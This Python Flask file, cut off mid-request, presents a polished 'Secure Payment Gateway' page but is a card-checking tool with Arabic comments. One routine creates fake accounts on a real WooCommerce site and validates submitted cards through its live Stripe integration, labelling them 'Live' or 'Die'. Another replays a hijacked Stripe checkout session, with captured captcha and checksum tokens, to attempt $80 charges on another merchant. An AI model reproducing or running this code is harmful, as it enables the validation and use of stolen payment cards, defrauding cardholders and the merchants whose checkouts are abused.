from flask import Flask, render_template_string, request, jsonify
import requests
import urllib.parse
import random
import uuid
import re

app = Flask(__name__)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Payment Gateway</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            max-width: 400px;
            width: 100%;
        }
        
        .payment-card {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .payment-header {
            background: #635bff;
            color: white;
            padding: 30px;
            text-align: center;
            position: relative;
        }
        
        .payment-header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .payment-header p {
            opacity: 0.9;
            font-size: 14px;
        }
        
        .gateway-badge {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(255,255,255,0.2);
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 600;
        }
        
        .payment-body {
            padding: 30px;
        }
        
        .amount {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .amount-label {
            font-size: 14px;
            color: #666;
            margin-bottom: 5px;
        }
        
        .amount-value {
            font-size: 32px;
            font-weight: 700;
            color: #333;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
            font-size: 14px;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        
        input:focus {
            outline: none;
            border-color: #635bff;
            box-shadow: 0 0 0 3px rgba(99, 91, 255, 0.1);
        }
        
        .row {
            display: flex;
            gap: 15px;
        }
        
        .row .form-group {
            flex: 1;
        }
        
        .pay-button {
            width: 100%;
            background: #635bff;
            color: white;
            border: none;
            padding: 15px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .pay-button:hover {
            background: #5a52e0;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(99, 91, 255, 0.3);
        }
        
        .pay-button:active {
            transform: translateY(0);
        }
        
        .security {
            text-align: center;
            margin-top: 20px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
            font-size: 12px;
            color: #666;
        }
        
        .security i {
            color: #00d924;
            margin-right: 5px;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e1e5e9;
        }
        
        .powered-by {
            font-weight: bold;
            font-size: 18px;
            color: #635bff;
            margin-bottom: 5px;
        }
        
        .by-line {
            font-size: 12px;
            color: #666;
        }
        
        .result-message {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            font-weight: 500;
            display: none;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin: 10px 0;
        }
        
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #635bff;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .gateway-selector {
            margin-bottom: 20px;
        }
        
        .gateway-buttons {
            display: flex;
            gap: 10px;
        }
        
        .gateway-btn {
            flex: 1;
            padding: 10px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            background: white;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
            font-size: 12px;
            font-weight: 600;
        }
        
        .gateway-btn.active {
            border-color: #635bff;
            background: #635bff;
            color: white;
        }
        
        .bio-section {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .bio-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .bio-subtitle {
            font-size: 12px;
            opacity: 0.9;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="bio-section">
            <div class="bio-title">Secure Payment Gateway</div>
            <div class="bio-subtitle">Advanced Payment Processing System</div>
        </div>
        
        <div class="payment-card">
            <div class="payment-header">
                <div class="gateway-badge" id="gatewayBadge">XXNX</div>
                <h1>Secure Payment</h1>
                <p>Enter your card details to complete the payment</p>
            </div>
            
            <div class="payment-body">
                <div class="gateway-selector">
                    <label>Payment Gateway</label>
                    <div class="gateway-buttons">
                        <button class="gateway-btn active" data-gateway="XXNX">XXNX Gate</button>
                        <button class="gateway-btn" data-gateway="B11HB">B11HB Gate</button>
                    </div>
                </div>
                
                <div class="amount">
                    <div class="amount-label">Total Amount</div>
                    <div class="amount-value">$80.00</div>
                </div>
                
                <form id="paymentForm">
                    <div class="form-group">
                        <label for="card_number">Card Number</label>
                        <input type="text" id="card_number" name="card_number" placeholder="4242 4242 4242 4242" maxlength="19" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="cardholder_name">Cardholder Name</label>
                        <input type="text" id="cardholder_name" name="cardholder_name" placeholder="John Doe" required>
                    </div>
                    
                    <div class="row">
                        <div class="form-group">
                            <label for="exp_month">Exp Month</label>
                            <input type="text" id="exp_month" name="exp_month" placeholder="MM" maxlength="2" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="exp_year">Exp Year</label>
                            <input type="text" id="exp_year" name="exp_year" placeholder="YY" maxlength="2" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="cvc">CVC</label>
                            <input type="text" id="cvc" name="cvc" placeholder="123" maxlength="3" required>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label for="email">Email</label>
                        <input type="email" id="email" name="email" placeholder="your@email.com" required>
                    </div>
                    
                    <div class="loading" id="loading">
                        <div class="spinner"></div>
                        <p>Processing payment...</p>
                    </div>
                    
                    <div class="result-message" id="resultMessage"></div>
                    
                    <button type="submit" class="pay-button" id="payButton">
                        Pay $80.00
                    </button>
                </form>
                
                <div class="security">
                    <i>🔒</i> Your payment information is secure and encrypted
                </div>
                
                <div class="footer">
                    <div class="powered-by">Powered by <span id="gatewayName">XXNX Gate</span></div>
                    <div class="by-line">by :@R_O_P_D</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentGateway = 'XXNX';
        
        // Gateway selection
        document.querySelectorAll('.gateway-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.gateway-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                currentGateway = this.dataset.gateway;
                document.getElementById('gatewayName').textContent = this.textContent;
                document.getElementById('gatewayBadge').textContent = currentGateway;
            });
        });
        
        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const payButton = document.getElementById('payButton');
            const loading = document.getElementById('loading');
            const resultMessage = document.getElementById('resultMessage');
            
            // Show loading, hide button
            payButton.style.display = 'none';
            loading.style.display = 'block';
            resultMessage.style.display = 'none';
            
            const formData = new FormData(this);
            formData.append('gateway', currentGateway);
            
            try {
                const response = await fetch('/process_payment', {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                // Show result message
                resultMessage.textContent = data.message;
                resultMessage.className = 'result-message ' + (data.status === 'success' ? 'success' : 'error');
                resultMessage.style.display = 'block';
                
            } catch (error) {
                resultMessage.textContent = 'An error occurred. Please try again.';
                resultMessage.className = 'result-message error';
                resultMessage.style.display = 'block';
            } finally {
                // Hide loading, show button
                loading.style.display = 'none';
                payButton.style.display = 'block';
            }
        });
        
        // Format card number input
        document.getElementById('card_number').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\\s+/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ');
            if (formattedValue) {
                e.target.value = formattedValue;
            }
        });
    </script>
</body>
</html>
'''

def B11HB(ccx):
    """وظيفة الفحص باستخدام waifanimals.org"""
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        
        headers = {
            'authority': 'waifanimals.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://waifanimals.org/my-account/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        r = requests.Session()
        response = r.get('https://waifanimals.org/my-account/', headers=headers)
        reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
        
        headers = {
            'authority': 'waifanimals.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://waifanimals.org',
            'referer': 'https://waifanimals.org/my-account/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        email = f"userndhp{random.randint(1000,9999)}@gmail.com"
        
        data = {
            'email': email,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://waifanimals.org/my-account/add-payment-method/',
            'wc_order_attribution_session_pages': '5',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'woocommerce-register-nonce': reg,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        
        response = r.post('https://waifanimals.org/my-account/', cookies=r.cookies, headers=headers, data=data)
        
        headers = {
            'authority': 'waifanimals.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://waifanimals.org/my-account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        response = r.get('https://waifanimals.org/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text).group(1)
        addnonce = response.text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
        
        headers = {
            'authority': 'm.stripe.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'text/plain;charset=UTF-8',
            'origin': 'https://m.stripe.network',
            'referer': 'https://m.stripe.network/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        response = r.post('https://m.stripe.com/6', cookies=r.cookies, headers=headers, json={})
        detet = response.json()
        guid = detet['guid']
        muid = detet['muid']
        sid = detet['sid']
        
        client_session_id = str(uuid.uuid4())
        elements_session_config_id = str(uuid.uuid4())
        times = random.randint(10000,99999)
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F8da149ee39%3B+stripe-js-v3%2F8da149ee39%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwaifanimals.org&time_on_page={times}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={pk_live}&_stripe_version=2024-06-20'
        
        response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        response_data = response.json()
        
        if 'id' not in response_data:
            return {'status': 'Error', 'message': 'Failed to create payment method', 'card': ccx, 'gateway': 'B11HB'}
            
        id = response_data['id']
        
        headers = {
            'authority': 'waifanimals.org',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://waifanimals.org',
            'referer': 'https://waifanimals.org/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        }
        
        response = r.post('https://waifanimals.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
        response_text = response.text
        
        if 'card was declined' in response_text or 'Your card could not be set up for future usage' in response_text:
            return {'status': 'Die', 'message': 'The card was declined.', 'card': ccx, 'gateway': 'B11HB'}
        elif 'Your card number is incorrect.' in response_text:
            return {'status': 'Die', 'message': 'Card number is incorrect.', 'card': ccx, 'gateway': 'B11HB'}
        elif 'success' in response_text or 'Success' in response_text:
            return {'status': 'Live', 'message': 'Approved', 'card': ccx, 'gateway': 'B11HB'}
        else:
            try:
                error_data = response.json()
                if 'data' in error_data and 'error' in error_data['data']:
                    error_msg = error_data['data']['error']['message']
                else:
                    error_msg = 'Unknown error occurred'
            except:
                error_msg = 'Failed to parse error response'
            return {'status': 'Error', 'message': error_msg, 'card': ccx, 'gateway': 'B11HB'}
            
    except Exception as e:
        return {'status': 'Error', 'message': str(e), 'card': ccx, 'gateway': 'B11HB'}

def translate_error_message(message):
    """ترجمة رسائل الخطأ إلى ردود أكثر احترافية"""
    error_mapping = {
        "Your card number is incorrect.": "رقم البطاقة غير صحيح ❌",
        "The card's security code is incorrect.": "رمز الأمان غير صحيح ❌",
        "Your card was declined.": "تم رفض البطاقة ❌",
        "Your card has expired.": "البطاقة منتهية الصلاحية ❌",
        "Insufficient funds.": "رصيد غير كافي ❌",
        "Invalid expiration date.": "تاريخ انتهاء الصلاحية غير صحيح ❌",
        "Card declined.": "بطاقة مرفوضة ❌",
        "Processing error.": "خطأ في المعالجة ❌",
        "Failed to create payment method": "فشل في إنشاء طريقة الدفع ❌",
        "Unknown error occurred": "حدث خطأ غير معروف ❌",
        "Failed to parse error response": "فشل في معالجة الاستجابة ❌"
    }
    
    return error_mapping.get(message, message)

@app.route('/')
def payment_page():
    return render_template_string(HTML_TEMPLATE)

@app.route('/process_payment', methods=['POST'])
def process_payment():
    gateway = request.form.get('gateway', 'XXNX')
    
    if gateway == 'B11HB':
        # استخدام بوابة B11HB
        card_number = request.form.get('card_number').replace(' ', '')
        exp_month = request.form.get('exp_month')
        exp_year = request.form.get('exp_year')
        cvc = request.form.get('cvc')
        cardholder_name = request.form.get('cardholder_name')
        
        cc_data = f"{card_number}|{exp_month}|{exp_year}|{cvc}"
        result = B11HB(cc_data)
        
        if result['status'] == 'Live':
            return jsonify({'status': 'success', 'message': 'Charged !✅'})
        else:
            translated_message = translate_error_message(result['message'])
            return jsonify({'status': 'error', 'message': translated_message})
    
    else:
        # استخدام بوابة XXNX الأصلية
        card_number = request.form.get('card_number')
        exp_month = request.form.get('exp_month')
        exp_year = request.form.get('exp_year')
        cvc = request.form.get('cvc')
        cardholder_name = request.form.get('cardholder_name')
        email = request.form.get('email')
        
        # Headers for the first request
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6,he;q=0.5',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://checkout.stripe.com',
            'referer': 'https://checkout.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        # First request data
        data1 = {
            'type': 'card',
            'card[number]': card_number.replace(' ', ''),
            'card[cvc]': cvc,
            'card[exp_month]': exp_month,
            'card[exp_year]': exp_year,
            'billing_details[name]': cardholder_name,
            'billing_details[email]': email,
            'billing_details[address][country]': 'GQ',
            'muid': '5be47679-08fa-40b3-9153-374bc5371432c2a0e8',
            'sid': 'f065f2b3-5a19-4a43-b95f-9002752c08291067ef',
            'guid': '56244ac2-525e-4c25-a045-5cec1bab5f545a20e7',
            'key': 'pk_live_51IPMPBCbQweON9shR8IRcNg9CfgREI5dMpuUzS19MdGRosb8pQScfDiuSaPNBlJmvOI7po6VFeaDMV2SY6NZZX1y005NWY0xJd',
            'payment_user_agent': 'stripe.js/5445b56991; stripe-js-v3/5445b56991; checkout',
            'client_attribution_metadata[client_session_id]': 'cs_live_a12AuZqQi8Gpl68nYSFCwUJvZEKsvnoWWWCJ9thIUclUrs4I77hnfF088i',
            'client_attribution_metadata[merchant_integration_source]': 'checkout',
            'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[checkout_config_id]': '1dc1632c-41fa-48eb-aed7-e732f3983a8c'
        }

        # Make first request
        response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data1)
        
        # Process first response
        if response1.status_code == 200:
            response1_data = response1.json()
            payment_method_id = response1_data.get('id')
            
            # Second request data
            data2 = {
                'eid': 'NA',
                'payment_method': payment_method_id,
                'expected_amount': '8000',
                'last_displayed_line_item_group_details[subtotal]': '8000',
                'last_displayed_line_item_group_details[total_exclusive_tax]': '0',
                'last_displayed_line_item_group_details[total_inclusive_tax]': '0',
                'last_displayed_line_item_group_details[total_discount_amount]': '0',
                'last_displayed_line_item_group_details[shipping_rate_amount]': '0',
                'expected_payment_method_type': 'card',
                'muid': '5be47679-08fa-40b3-9153-374bc5371432c2a0e8',
                'sid': 'f065f2b3-5a19-4a43-b95f-9002752c08291067ef',
                'guid': '56244ac2-525e-4c25-a045-5cec1bab5f545a20e7',
                'key': 'pk_live_51IPMPBCbQweON9shR8IRcNg9CfgREI5dMpuUzS19MdGRosb8pQScfDiuSaPNBlJmvOI7po6VFeaDMV2SY6NZZX1y005NWY0xJd',
                'version': '5445b56991',
                'init_checksum': 'szqyDq8ERgEGOJUb51Gk50sTO0yOoM7o',
                'js_checksum': 'qto~d%5En0%3DQU%3Eazbu%5Db_%3B%24u_PeyaSUr%5Ev~Cox%3CMYyDtXSeS%5B%5Eo%3FU%5E%60w',
                'passive_captcha_token': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYwODEzMTA0LCJjZGF0YSI6ImVYZkdsaGlyMXZZaXBsQnM2bmx3WXhGa2xJenFGTkh5dTN5VnNwaGpveEpqTFFyZEZZVjRXeDgweTFaYTQ0Z1RITDhqYjRmTFRIRDBFZGdCWld4VXZqb0Rpa1hRRE1jbGNMYmxyTWdoMytMKzdyNEZCZTdKZDgrSFBSYlIzNENuWDFremsrdHUwdk5nbGxtVkNQZ0VoT21FbmhkRVhuOXJ2UTcrK3cxS29xN2kxK0MwRVhyaVdTOGlRa1FpQnRxcC8wem1lMXZxYjVhZE9pVT1odkM2Snk5a0FDTnN5aUs1IiwicGFzc2tleSI6IlVwQThlS2EvUGFRc2tFbVF6Yzc4L2dqcU0vTWNPZXc5cS82bzBVN1ZFZFhQa0RJREQxd3dwR1VycW12QS9TbXpleVJadU5uVVQ0VDk2b2IvRXhhd1U0WjIzVW1LSUhXVUdyMXBlbUpqZjdOR0psUlJTT2hQUEMwcmlBY1BvNE9kZ0dGczh4S1Q0YVJDcmtCSVZDNW0zN1U3alpOTm9qMnVqVjVpcXBMZG83TmVqNHRwWmpKem5FM05yMUk1TjU5TGpKRmhHeFhlYlFwcW9XUitlR0hjRnY3RXZ0d0cvc3l2TkVubFZXc3NWMit1MndHSVFCZW9EY1h3RE9BQkFZUys5TEpQc096RFJZKzBnZ3JmeUg5ZnFlU0NzWkZhQXl1QXVrSThtVXY1VGxjTWZ0MVBlV1FGMmhhRXYvdDhsUElQOTJ3ZnE1eStwTTNZWG9IN1RiSnRDR3pvTU96ZmRLRkk1UDRCbXh4RE44WGg2SVVFUFhSNVFMdHZFYzd1blV1dm1nTWQxVjdhREpYWm1WRWVJSmlraWZyWFBkQ0R4bWthOXVCWUxIVDhoN0tkK2FDRS8wRUllNlhkaFJWVlh2U0h3ZWdBbm9tOGdJWGx3d3pjTzRmVnRQOWhMd1RNZ1VWaFNnS3dmNXF6RTFHdnkvZjNQUy9TYS9CeGFmUGFHMmMySEllQWRTby9UZHNxOGprVE5sWGtaMnpwTE5xNWdrOUd0d3Y3TVRQOElhMkdCTWdYeEhPVWIvZlhta01PelIzS3MrdCtJSy9GZFV2UFhCdG5nNmhWZnk1MFhGeGF1czZVWUtQWlVpelEySmhkVmQvTGxHbitIWFZDZjVqbm8rbGU2emNsdGVacklpVGtDenJnL3JMMHhPYzUyTlRSK1gxZEIySUFtMjlNc0tsdFFSRkFiMndoamo1OFhPMlFFeGZHTUZIMTd6a0lydHFZSlN2ZzRDMHVyMHlQdWkzSWpVYUU3NTN3SW1jT0VJSkhNUTUvZHZJQnhrTnhHdHhvTkU0YUI4MC8wcFRERDRDUmZhN3lILzdRaVdSb2xPaUg4S3E0UFN5QkJZb3NaVXo0YzIvY3dObDIxbWhWSkcwNnhLZmhPcnY3bWYrZnZxb2N0UGd6OFRGR0FBak5YOEl5dGxOM3FhT2c5UkNWZjlZUWNXK3JqVGVvazZHbEh6ZjBOM1dvSjQ0M3JDNnRqUy9XNDdLaloxbnVSMENPZjc4dkM3eGRhQjVwZHZrNWtyRWZidTJQaEVhYVptckpHOWxCUE1ORjhHVWZVdjBIWE9lR1BLaUxCN0FUcHVrNmQ1OHR1Nkx1MzRJSFM1a2xsdW9qV2NHNmxwOEZoL25EUktHTEk5UThZdDdDQWNJMjc3eVI2RXpDMWUrQzI0UERQR25mbDZXc0NicEpUTjhrYzNJbHFMQUNOT0l3M25INElmT2dCUnk5dFF3KzFXVGY0QWtobWtNM0U3UzV1K05nYWdGVjFkODZxUXQydGtjSklFWDE3enFpcGlwcXl3QW5oRmJhWndCWFluVXl0SVVtNE1CRUlvNFJUQkpTd2NrTDBnY3N5cnNsWmdOOTgvWFpUdXg0U1NycmdFSWxlaVBEZXZ0eWwxbnB5MWpBeXJJNjZYRTNaL3dHSWhuUzE2V1BpTDA2aTBmazRnbWFJVWdOclI1OUNudXJmVVhkQ3JaZ3BpRm1sdFYvYXYyMVpQeFhEWENxWGo4d2NGc3daY0tudmZOOTNJN2ZjN0l6WStkNUlnTzlvOTNnNENHckk4cnJWNEtvWWFZeFFIbExOZkF2QW40dFZOcjkrdE1wN21CZTFXMERHN29waVhqMEZTdGV2VS9KdFNRWmlkNUN0SUJEOWNZVTJsUHhlQmJzdFFTcmFBcXE0b0hIZmdYY291L2lsbmdGaHdTait3eGEzRTkySi8rS281L25YU3VrNUl3dFRERHpUeUJuV0V4YUx0TGx5dGFZU3diclV6NnBadWlscGNIellyTldOa3VBeGdqOEptYjZDbDNuVUIxVDFFK2FJS2oweGNDcGZvWDUzYWVFcWErd3pHM0crb3BQRXRKR2VYNWhySHdwZUtMZzE5UkxFTVl0VTBLSi96bEtFdnYwalIxT29OWmNGcnB5dEVhYXljaENZU1YrYVM2cWMyVVk0RTdxKzM1VDdBa3hzVmNRRlBsdGkrT1lxMEZXWjQ3ajZGOVlmdngzdDhXam5wRmVNSmxvZ2JqTy9IcnRSYk1qU1NQY3RvNk5VclViaHQ0QUVpbXBRblhrNkZrT2phTmFKeEM0TkcwS2Y1YTRxZS9qTjg5alB4czk4dFduNyt4ZjZ6VU1KdUF6aUpsaE1GNitHdDZVbjRhbTQ5cHVRYjNIaWZSNHJIU3cyb3czQTVOZkhqczkiLCJrciI6IjFmOGY2MDM1Iiwic2hhcmRfaWQiOjUzNTc2NTU5fQ.HVJOuAq6CMzwr5c0xNwkgKC8H7VhEitBhE8nYUkEWa8',
                'passive_captcha_ekey': '',
                'rv_timestamp': 'qto%3En%3CQ%3DU%26CyY%26%60%3EX%5Er%3CYNr%3CYN%60%3CY_C%3CY_C%3CY%5E%60zY_%60%3CY%5En%7BU%3Eo%26U%26CyXOP%24XRn%23X%26%23CYOMvYxn%3B%5BboyeOLCY%3D%5DuYO%5Dv%5BOd%26Y%26PCY_%3BDXRd%3C%5BNn%7BU%3Ee%26U%26CyX_Mye%26%23%3Cd%3DerXO%23CYuX%26d%3D%5CDeO%3BCdOYyXxX%3Ed%26L%25d%3Dd%25Y_T%3Ceu%60%3EX%3DMxe%26%5C%26eun%25eueyYu%5DrXuYsXun%26XRQsYto%3FU%5E%60w',
                'referrer': 'https://www.mtcgame.com',
                'client_attribution_metadata[client_session_id]': 'cs_live_a12AuZqQi8Gpl68nYSFCwUJvZEKsvnoWWWCJ9thIUclUrs4I77hnfF088i',
                'client_attribution_metadata[merchant_integration_source]': 'checkout',
                'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[checkout_config_id]': '1dc1632c-41fa-48eb-aed7-e732f3983a8c'
            }

            # Make second request
            response2 = requests.post(
                'https://api.stripe.com/v1/payment_pages/cs_live_a12AuZqQi8Gpl68nYSFCwUJvZEKsvnoWWWCJ9thIUclUrs4I77hnfF088i/confirm',
                headers=headers,
